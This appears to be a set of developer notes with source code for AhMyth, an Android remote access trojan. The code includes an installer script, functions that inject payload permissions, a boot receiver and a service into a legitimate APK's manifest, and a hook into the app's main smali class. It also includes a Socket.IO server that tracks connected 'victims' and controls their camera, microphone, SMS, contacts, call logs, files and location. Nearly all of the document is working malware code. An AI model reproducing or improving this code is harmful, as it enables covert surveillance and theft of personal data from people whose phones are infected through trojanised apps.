## New Autoinstall code.
> Thank you to karma0x309 for the base of this code
```bash
#!/bin/sh

# Get the path to the script's directory
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Check package manager
if [ -x "$(command -v apt-get)" ]; then
    PACKAGE_MANAGER="apt-get"
elif [ -x "$(command -v pacman)" ]; then
    PACKAGE_MANAGER="pacman"
else
    echo -e "Unsupported package manager.\nThis script currently supports APT and Pacman-based systems."
    exit 1
fi

java_install() {
    echo -e "\nInstalling Java 11...\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y openjdk-11-jdk
        update-java-alternatives -s java-11-openjdk-amd64
        update-alternatives --set java /usr/lib/jvm/java-11-openjdk-amd64/jre/bin/java
        update-alternatives --set javac /usr/lib/jvm/java-11-openjdk-amd64/bin/javac
        update-alternatives --set javaws /usr/lib/jvm/java-11-openjdk-amd64/jre/bin/javaws
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy jdk11-openjdk
    fi
    echo -e "\nJava 11 has been installed successfully."
    sleep 2
    clear
}

nodejs_install() {
    echo -e "\nInstalling Node.js...\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y nodejs
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy nodejs
    fi
    echo -e "\nNode.js has been installed successfully."
    sleep 2
    clear
}

npm_install() {
    echo -e "\nInstalling npm...\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y npm
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy npm
    fi
    echo -e "\nnpm has been installed successfully."
    sleep 2
    clear
}

git_install() {
    echo -e "\nInstalling Git...\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y git
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy git
    fi
    echo -e "\nGit has been installed successfully."
    sleep 2
    clear
}

electron_install() {
    echo -e "\nInstalling Electron v11.0.0...\n"
    npm i -g electron@11.0.0
    echo -e "\nDone."
    sleep 2
    clear
}

create_system_shortcut() {
    # Create ahmyth file and grant executable permissions
    echo -e "\nCreating ahmyth file and granting executable permissions...\n"
    echo '#!/bin/sh' > ahmyth
    echo "if [ \"\$(id -u)\" = \"0\" ]; then" >> ahmyth
    echo "    npx electron \"$SCRIPT_DIR/app\" --no-sandbox start" >> ahmyth
    echo "else" >> ahmyth
    echo "    npm start --prefix \"$SCRIPT_DIR\"" >> ahmyth
    echo "fi" >> ahmyth
    chmod +x ahmyth
    echo -e "\nahmyth file has been created and executable permissions have been granted."
    sleep 2
    clear

    # Move ahmyth file to /usr/local/sbin
    echo -e "\nMoving ahmyth file to /usr/local/sbin...\n"
    if [ -d "/usr/local/sbin" ]; then
        mv ahmyth /usr/local/sbin
        echo -e "\nahmyth file has been moved to /usr/local/sbin."
    else
        echo -e "/usr/local/sbin directory not found! Unable to move ahmyth file."
    fi
    sleep 2
    clear
}

# Check if user is root
if [ "$(id -u)" != "0" ]; then
    echo -e "This script must be run as root!" >&2
    exit 1
fi

# Update and upgrade
clear
echo -e "Updating and upgrading...\n"
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    apt-get update && apt-get upgrade -y
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    pacman -Syu --noconfirm
fi
echo -e "\nUpdate and Upgrade done."
sleep 2
clear

# Check if Java 11 is installed
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    if [ -z "$(dpkg -l | grep openjdk-11)" ]; then
        echo -e "Java 11 is not installed!"
        java_install
    fi
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    if ! pacman -Qi jdk11-openjdk >/dev/null 2>&1; then
        echo -e "Java 11 is not installed!"
        java_install
    fi
fi

# Check if nodejs is installed
if [ -z "$(command -v node)" ]; then
    echo -e "Node.js is not installed!" >&2
    nodejs_install
fi

# Check if npm is installed
if [ -z "$(command -v npm)" ]; then
    echo -e "npm is not installed!" >&2
    npm_install
fi

# Check if git is installed
if [ -z "$(command -v git)" ]; then
    echo -e "Git is not installed!" >&2
    git_install
fi

# Check if electron v11 is installed
if [ -z "$(command -v electron)" ]; then
    echo -e "electron has not been installed by npm!\n" >&2
    electron_install
fi

# Check if ahmyth system shortcut exists, create it if not
if [ -z "$(command -v ahmyth)" ]; then
    echo -e "\nahmyth system shortcut doesn't exist. Creating..."
    create_system_shortcut
fi

# Check if all dependencies are installed
if [ -x "$(command -v electron)" ] && [ -x "$(command -v node)" ] && [ -x "$(command -v npm)" ] && [ -x "$(command -v git)" ] && [ -f "/usr/local/sbin/ahmyth" ]; then
    echo -e "\nAll Dependencies are Installed\n"
    exit 0
fi
```
## Updated `"copyPermissions"` function w/ updated permissions checkbox code.
```javascript
$appCtrl.copyPermissions = (data, callback) => {
    var checkBoxofCamera = document.getElementById("Permissions1");
    var checkBoxofStorage = document.getElementById("Permissions2");
    var checkBoxofMic = document.getElementById("Permissions3");
    var checkBoxofLocation = document.getElementById("Permissions4");
    var checkBoxofContacts = document.getElementById("Permissions5");
    var checkBoxofSms = document.getElementById("Permissions6");
    var checkBoxofCallsLogs = document.getElementById("Permissions7");

    // default permissions for the payload
    const permissions = CONSTANTS.permissions;

    // Create an array to store the selected permissions
    var selectedPermissions = [];

    // Check each checkbox and add the corresponding permission to the selectedPermissions array
    if (checkBoxofCamera.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
    }
    if (checkBoxofStorage.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
    }
    if (checkBoxofMic.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
    }
    if (checkBoxofLocation.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
    }
    if (checkBoxofContacts.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
    }
    if (checkBoxofSms.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
    }
    if (checkBoxofCallsLogs.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
    }

    // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
    if (
        checkBoxofCamera.checked &&
        checkBoxofStorage.checked &&
        checkBoxofMic.checked &&
        checkBoxofLocation.checked &&
        checkBoxofContacts.checked &&
        checkBoxofSms.checked &&
        checkBoxofCallsLogs.checked
    ) {
        selectedPermissions = permissions;
    }

    // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
    if (
        !checkBoxofCamera.checked &&
        !checkBoxofStorage.checked &&
        !checkBoxofMic.checked &&
        !checkBoxofLocation.checked &&
        !checkBoxofContacts.checked &&
        !checkBoxofSms.checked &&
        !checkBoxofCallsLogs.checked
    ) {
        selectedPermissions = permissions;
    }

    delayedLog('[★] Parsing the Android Manifest XML Data...');

    // Convert data to a string if it's not already a string
    if (typeof data !== 'string') {
        data = data.toString();
    }

    xml2js.parseString(data, {
        explicitArray: false
    }, (err, result) => {
        if (err) {
            callback('[x] Unable to Parse the Android Manifest XML Data!', CONSTANTS.logStatus.FAIL);
            return;
        }

        const manifestObj = result.manifest;

        // Check if receiver and service properties are arrays
        if (!Array.isArray(manifestObj.application.receiver)) {
            manifestObj.application.receiver = manifestObj.application.receiver ? [manifestObj.application.receiver] : [];
        }

        if (!Array.isArray(manifestObj.application.service)) {
            manifestObj.application.service = manifestObj.application.service ? [manifestObj.application.service] : [];
        }

        // store existing permissions
        const existingPermissions = new Set();

        // Check if permissions already exist in the manifest
        if (manifestObj['uses-permission']) {
            if (!Array.isArray(manifestObj['uses-permission'])) {
                manifestObj['uses-permission'] = [manifestObj['uses-permission']];
            }
            manifestObj['uses-permission'].forEach((permission) => {
                existingPermissions.add(permission.$['android:name']);
            });
        } else {
            manifestObj['uses-permission'] = [];
        }

        // Check if features already exist in the manifest
        if (manifestObj['uses-feature']) {
            if (!Array.isArray(manifestObj['uses-feature'])) {
                manifestObj['uses-feature'] = [manifestObj['uses-feature']];
            }
            manifestObj['uses-feature'].forEach((feature) => {
                existingPermissions.add(feature.$['android:name']);
            });
        } else {
            manifestObj['uses-feature'] = [];
        }

        // Filter selected permissions to exclude duplicates
        const filteredPermissions = selectedPermissions.filter((permission, index, self) => {
            return self.indexOf(permission) === index && !existingPermissions.has(permission);
        });

        delayedLog('[★] Injecting AhMyth Payload Permissions...');

        // Add new permissions and features based on filteredPermissions
        filteredPermissions.forEach(permission => {
            if (permission === 'android.hardware.camera') {
                manifestObj['uses-feature'].push({
                    $: {
                        'android:name': 'android.hardware.camera'
                    },
                    _: '' // Add empty string as element text
                });
            }

            if (permission === 'android.hardware.camera.autofocus') {
                manifestObj['uses-feature'].push({
                    $: {
                        'android:name': 'android.hardware.camera.autofocus'
                    },
                    _: '' // Add empty string as element text
                });
            }

            if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                manifestObj['uses-permission'].push({
                    $: {
                        'android:name': permission
                    },
                    _: '' // Add empty string as element text
                });
            }
        });

        delayedLog('[★] Injecting AhMyth Payload Service and Receiver...');

        // Construct the receiver and service tags using constants
        const receiverTag = {
            $: {
                'android:enabled': 'true',
                'android:exported': 'true',
                'android:name': CONSTANTS.ahmythReceiver,
            },
            'intent-filter': {
                action: {
                    $: {
                        'android:name': 'android.intent.action.BOOT_COMPLETED',
                    },
                },
            },
        };

        const serviceTag = {
            $: {
                'android:enabled': 'true',
                'android:exported': 'false',
                'android:name': CONSTANTS.ahmythService,
            },
        };

        // Add the receiver and service tags to the application node
        manifestObj.application.receiver.push(receiverTag);
        manifestObj.application.service.push(serviceTag);

        const builder = new xml2js.Builder({
            renderOpts: {
                pretty: true,
                indent: '    '
            },
            headless: true
        });

        // Modify the parsed object by finding and updating the closing application tag
        const closingAppTag = '</application>';
        const modifiedClosingAppTag = '\n  </application>';
        const xmlString = builder.buildObject(result);
        const modifiedXml = xmlString.replace(closingAppTag, modifiedClosingAppTag);

        // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
        const closingManifestTag = '</manifest>';
        const finalModifiedXml = modifiedXml.replace(closingManifestTag, '</manifest>');

        callback(null, finalModifiedXml);
    });
};
```
## Updated `"BindOnBoot"` function
```javascript
// "Bind On Boot" method
$appCtrl.BindOnBoot = (apkFolder) => {
    const manifestPath = dir.join(apkFolder,
        'AndroidManifest.xml');

    delayedLog('[★] Reading the Android Manifest XML File...')
    fs.readFile(manifestPath,
        'utf8',
        (err, data) => {
            if (err) {
                delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.copyPermissions(data, (err, finalModifiedXml) => {
                if (err) {
                    callback(err);
                    return;
                }

                delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File...');
                fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[x] Unable to Write Payload Injections back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder)
                });

            });
        });
};
```
## Updated `"BindOnLauncher"` function
```javascript
// "Bind On Launch" method
$appCtrl.BindOnLauncher = (apkFolder) => {
    const manifestPath = dir.join(apkFolder,
        'AndroidManifest.xml');

    delayedLog('[★] Reading the Android Manifest XML File...');
    fs.readFile(manifestPath,
        'utf8',
        (error, data) => {
            if (error) {
                delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                return;
            }

            $appCtrl.copyPermissions(data, (err, finalModifiedManifest) => {
                if (err) {
                    callback(err);
                    return;
                }

                delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File...');
                fs.writeFile(manifestPath, finalModifiedManifest, 'utf8', (error) => {
                    if (error) {
                        delayedLog('[x] Unable to Write Payload Injection back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    delayedLog('[★] Reading the Modified Android Manifest XML File...')
                    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Unable to Read the Modified Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                            return;
                        }

                        delayedLog('[★] Parsing the Modified Android Manifest XML Data...')
                        xml2js.parseString(data, (err, result) => {
                            if (err) {
                                delayedLog('[x] Unable to Parse the Modified Android Manifest XML Data!', CONSTANTS.logStatus.FAIL);
                                WriteErrorLog(err, 'Parsing');
                                return;
                            }

                            delayedLog('[★] Searching the Modified Android Manifest for a Suitable Main Class...');

                            const launcherActivity = GetLauncherActivity(result, apkFolder);
                            if (launcherActivity === -1) {
                                delayedLog('[x] Cannot Locate a Suitable Main Class in the Manifest!', CONSTANTS.logStatus.FAIL);
                                delayedLog('[x] Please use Another APK as a Template!.', CONSTANTS.logStatus.FAIL);
                                return;
                            }

                            delayedLog('[★] Locating the Main Class Smali File...');
                            const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                                if (err) {
                                    delayedLog('[x] Unable to Locate the Main Class Smali File!', CONSTANTS.logStatus.FAIL);
                                    delayedLog('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
                                    return;
                                } else {
                                    delayedLog('[¡] Main Class Smali File Found: ' + launcherPath, CONSTANTS.logStatus.INFO);
                                }

                                delayedLog('[★] Reading the Main Class Smali File...');
                                fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                                    if (error) {
                                        delayedLog('[x] Unable to Read the Main Smali Class File!', CONSTANTS.logStatus.FAIL);
                                        return;
                                    }

                                    const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                                    var hook = CONSTANTS.hookPoint;

                                    delayedLog('[★] Injecting AhMyth Hook into the Main Class Smali File...');

                                    var output = data.replace(hook, startService);
                                    fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                        if (error) {
                                            delayedLog('[x] Unable to Hook the Main Class Smali File!', CONSTANTS.logStatus.FAIL);
                                            return;
                                        }

                                        delayedLog('[★] Reading the Target SDK Version in the Manifest...');
                                        fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                                            if (error) {
                                                delayedLog('[x] Unable to Read the Target SDK Version in the Manifest!', CONSTANTS.logStatus.FAIL);
                                                return;
                                            }

                                            delayedLog('[★] Modifying the Target SDK Version in the Manifest...');

                                            var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                            var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                            var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                            var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;

                                            var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                            .replace(compSdkVerNameRegex, "$111" + '"')
                                            .replace(platVerCoRegex, "$122" + '"')
                                            .replace(platVerNameRegex, "$111" + '"');

                                            fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), repXmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    delayedLog('[x] Unable to Modify the Target SDK in the Manifest!', CONSTANTS.logStatus.FAIL);
                                                    return;
                                                }
                                                delayedLog('[★] Reading the Target SDK Version in the "apktool.yml" File...')
                                                fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                                    if (error) {
                                                        delayedLog('[x] Unable to Read the Target SDK version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                                        return;
                                                    }
                                                    delayedLog('[★] Modifying the Target SDK Version in the "apktool.yml" File...')
                                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                                    var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                                    .replace(tarSdkRegex, "$122'");

                                                    fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                        if (error) {
                                                            delayedLog('[x] Unable to Modify the Target SDK Version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                                            return;
                                                        }
                                                        $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
                                                    });
                                                });
                                            });
                                        });
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
};
```
## Code for Disconnect/Stop function
> Seems to be doing what I want it to, just need to tweak some things first, then field test it.
- Index.html
```html
<button ng-click="clearLogs(); isListen=true;Listen(port)" class="ui labeled icon black button"><i class="terminal icon"></i>Listen</button>
<button ng-click="clearLogs(); StopListening(port)" class="ui labeled icon black button"><i class="terminal icon"></i>Stop</button>
```

- main.js (Main Process)
```javascript
let isListening = false;

ipcMain.on('SocketIO:Listen', function (event, port) {
  if (isListening) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  IO = io.listen(port);
  IO.sockets.pingInterval = 10000;
  IO.sockets.on('connection', function (socket) {
    // Get victim info
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;
    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
    var country = null;
    var geo = geoip.lookup(ip); // check ip location
    if (geo)
      country = geo.country.toLowerCase();

    // Add the victim to victimList
    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);


    //------------------------Notification SCREEN INIT------------------------------------
    // create the Notification window
    let notification = new BrowserWindow({
      frame: false,
      x: display.bounds.width - 280,
      y: display.bounds.height - 78,
      show: false,
      width: 280,
      height: 78,
      resizable: false,
      toolbar: false,
      webPreferences: {
        nodeIntegration: true,
        enableRemoteModule: true
      }
    });

    // Emitted when the window is finished loading.
    notification.webContents.on('did-finish-load', function () {
      notification.show();
      setTimeout(function () { notification.destroy() }, 3000);
    });

    notification.webContents.victim = victimsList.getVictim(index);
    notification.loadFile(__dirname + '/app/notification.html');



    //notify renderer proccess (AppCtrl) about the new Victim
    win.webContents.send('SocketIO:NewVictim', index);

    socket.on('disconnect', function () {
      // Decrease the socket count on a disconnect
      victimsList.rmVictim(index);

      //notify renderer proccess (AppCtrl) about the disconnected Victim
      win.webContents.send('SocketIO:RemoveVictim', index);

      if (windows[index]) {
        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
        //delete the window from windowsList
        delete windows[index]
      }

      //notify renderer proccess (LabCtrl) if opened about the Server Disconnecting 
      if (windows[index]) {
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
        // delete the window from the winowsList
        delete windows[index]
      }
    });

  });

  event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
  isListening = true;

});

// fired when the stop button is clicked
ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IO) {
      IO.close();
      IO = null;
      event.reply('SocketIO:Stop', '[✓] Stopped listening on all Ports');
      isListening = false;
  } else {
      event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening');
  }
});

process.on('uncaughtException', function (error) {
  if (error.code == "EADDRINUSE") {
      win.webContents.send('SocketIO:ListenError', "Address Already in Use");
  } else {
      electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
  }
});



// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 700,
    height: 750,
    show: false,
    darkTheme: true,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true
    }
  })

  //add this window to windowsList
  windows[index] = child.id;
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadFile(__dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});
```

- AppCtrl.js (Render Process)
```javascript
  $appCtrl.Listen = (port) => {
    if (!port) {
      port = CONSTANTS.defaultPort;
    }

    ipcRenderer.send("SocketIO:Listen", port);
  };

  $appCtrl.StopListening = (port) => {
    if (!port) {
      port = CONSTANTS.defaultPort;
    }

    ipcRenderer.send("SocketIO:Stop", port);
  };

  ipcRenderer.on("SocketIO:Listen", (event, message) => {
    $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
    $appCtrl.isListen = true;
    $appCtrl.$apply();
  });

  ipcRenderer.on("SocketIO:Stop", (event, message) => {
    $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
    $appCtrl.isListen = false;
    $appCtrl.$apply();
  });

  ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
    viclist[index] = victimsList.getVictim(index);
    $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
    $appCtrl.$apply();
  });

  ipcRenderer.on("SocketIO:ListenError", (event, error) => {
    $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
    $appCtrl.isListen = false;
    $appCtrl.$apply();
  });

  ipcRenderer.on("SocketIO:StopError", (event, error) => {
    $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
    $appCtrl.isListen = false;
    $appCtrl.$apply();
  });

  ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
    $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
    delete viclist[index];
    $appCtrl.$apply();
  });

  $appCtrl.openLab = (index) => {
    ipcRenderer.send('openLabWindow', 'lab.html', index);
  };
```
- LabCtrl.js
```js
    //fired when notified from the Main Process (main.js) about
    // the Server disconnection
    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
        $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
    });
```
